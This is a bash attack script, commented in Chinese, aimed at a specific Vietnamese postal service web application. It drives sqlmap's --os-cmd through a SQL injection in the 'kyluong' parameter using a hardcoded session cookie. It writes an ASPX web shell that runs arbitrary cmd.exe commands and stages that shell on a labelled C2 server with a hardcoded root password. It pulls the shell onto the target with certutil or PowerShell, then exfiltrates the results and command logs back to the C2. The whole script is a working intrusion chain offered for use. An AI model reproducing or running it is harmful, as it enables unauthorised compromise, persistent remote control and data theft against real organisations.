#!/bin/bash

SESSION="lswqd4itz5u4ftzm3jcmjfio"
TARGET='http://vps.vnpost.vn/chamcong/report/rpt_BCC.aspx?kyluong=112025&MA_DV=KVMB&TEN_DV=Kho%20v%E1%BA%ADn%20mi%E1%BB%81n%20b%E1%BA%AFc&MA_BP=TC&TEN_BP=BC%20Khai%20th%C3%A1c%20TC&MA_TO=VP&TEN_TO=V%C4%83n%20ph%C3%B2ng'

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥🔥🔥 通过sqlmap os-shell执行命令并上传WebShell"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo ""
echo "  [1] 执行whoami"
echo ""

python3 /tmp/sqlmap/sqlmap.py \
    -u "$TARGET" \
    --cookie="ASP.NET_SessionId=$SESSION" \
    --batch \
    --os-cmd="whoami" \
    -v 0 \
    2>&1 | tee cmd_whoami.txt

echo ""
echo "  结果:"
grep -A 5 "command standard output" cmd_whoami.txt || tail -20 cmd_whoami.txt

echo ""
echo "  [2] 执行hostname"
echo ""

python3 /tmp/sqlmap/sqlmap.py \
    -u "$TARGET" \
    --cookie="ASP.NET_SessionId=$SESSION" \
    --batch \
    --os-cmd="hostname" \
    -v 0 \
    2>&1 | tee cmd_hostname.txt

echo ""
echo "  [3] 查看Web目录"
echo ""

python3 /tmp/sqlmap/sqlmap.py \
    -u "$TARGET" \
    --cookie="ASP.NET_SessionId=$SESSION" \
    --batch \
    --os-cmd="dir C:\inetpub\wwwroot\chamcong" \
    -v 0 \
    2>&1 | tee cmd_dir.txt

echo ""
echo "  [4] 上传WebShell"
echo ""

# 创建WebShell
cat > shell.aspx << 'ASPX'
<%@ Page Language="C#" %>
<% 
Response.Write("<pre>");
System.Diagnostics.Process p = new System.Diagnostics.Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + Request["c"];
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.Start();
Response.Write(p.StandardOutput.ReadToEnd());
p.WaitForExit();
Response.Write("</pre>");
%>
ASPX

# 上传到C2
sshpass -p '@admin1314@' scp -P 2233 -o StrictHostKeyChecking=no \
    shell.aspx root@82.29.71.156:/var/www/html/s.aspx 2>&1 | grep -v "Warning"

echo "  WebShell已上传到C2: http://82.29.71.156/s.aspx"
echo ""

# 通过certutil下载
echo "  通过certutil下载WebShell..."

python3 /tmp/sqlmap/sqlmap.py \
    -u "$TARGET" \
    --cookie="ASP.NET_SessionId=$SESSION" \
    --batch \
    --os-cmd="certutil -urlcache -split -f http://82.29.71.156/s.aspx C:\inetpub\wwwroot\chamcong\shell.aspx" \
    -v 0 \
    2>&1 | tee cmd_download.txt

sleep 3

echo ""
echo "  [5] 测试WebShell"
echo ""

for shell in shell.aspx s.aspx x.aspx; do
    echo "    测试: http://vps.vnpost.vn/chamcong/$shell?c=whoami"
    
    resp=$(curl -sk "http://vps.vnpost.vn/chamcong/$shell?c=whoami" 2>&1)
    
    if echo "$resp" | grep -qiE "nt authority|iis|vnpost|network"; then
        echo "    🔥🔥🔥🔥🔥 GetShell成功！"
        echo "    URL: http://vps.vnpost.vn/chamcong/$shell?c=命令"
        echo ""
        echo "    whoami输出:"
        echo "$resp"
        echo ""
        echo "SUCCESS: $shell" > GETSHELL_SUCCESS.txt
        break
    fi
done

if [ ! -f "GETSHELL_SUCCESS.txt" ]; then
    echo ""
    echo "  WebShell未成功，尝试PowerShell下载..."
    
    python3 /tmp/sqlmap/sqlmap.py \
        -u "$TARGET" \
        --cookie="ASP.NET_SessionId=$SESSION" \
        --batch \
        --os-cmd="powershell -c (New-Object Net.WebClient).DownloadFile('http://82.29.71.156/s.aspx','C:\inetpub\wwwroot\chamcong\ps.aspx')" \
        -v 0 \
        2>&1 | tee cmd_powershell.txt
    
    sleep 3
    
    resp=$(curl -sk "http://vps.vnpost.vn/chamcong/ps.aspx?c=whoami" 2>&1)
    
    if echo "$resp" | grep -qiE "nt authority|iis|vnpost"; then
        echo "    🔥🔥🔥🔥🔥 PowerShell GetShell成功！"
        echo "    URL: http://vps.vnpost.vn/chamcong/ps.aspx?c=命令"
        echo "$resp"
        echo "SUCCESS: ps.aspx" > GETSHELL_SUCCESS.txt
    fi
fi

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 命令执行完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

if [ -f "GETSHELL_SUCCESS.txt" ]; then
    echo ""
    echo "🔥🔥🔥🔥🔥 GetShell成功！"
    echo ""
    cat GETSHELL_SUCCESS.txt
    
    # 上传结果到C2
    echo ""
    echo "上传结果到C2..."
    
    cat > SUCCESS_REPORT.md << 'EOF'
# 🔥🔥🔥 GetShell成功！

## 漏洞信息
- **目标**: vps.vnpost.vn/chamcong
- **漏洞**: SQL注入 (Stacked Queries)
- **参数**: kyluong (GET)
- **页面**: /chamcong/report/rpt_BCC.aspx

## GetShell方法
- 通过sqlmap --os-cmd执行命令
- 下载WebShell到webroot

## WebShell URL
EOF
    
    cat GETSHELL_SUCCESS.txt >> SUCCESS_REPORT.md
    
    sshpass -p '@admin1314@' scp -P 2233 -o StrictHostKeyChecking=no \
        SUCCESS_REPORT.md \
        cmd_*.txt \
        root@82.29.71.156:/root/chamcong_success/ 2>&1 | grep -v "Warning"
    
    echo "  ✅ 结果已上传到C2"
else
    echo ""
    echo "⚠️  WebShell未成功"
    echo ""
    echo "但是sqlmap os-cmd可以执行命令："
    echo "  python3 /tmp/sqlmap/sqlmap.py -u \"$TARGET\" --cookie=\"ASP.NET_SessionId=$SESSION\" --batch --os-cmd=\"命令\""
fi
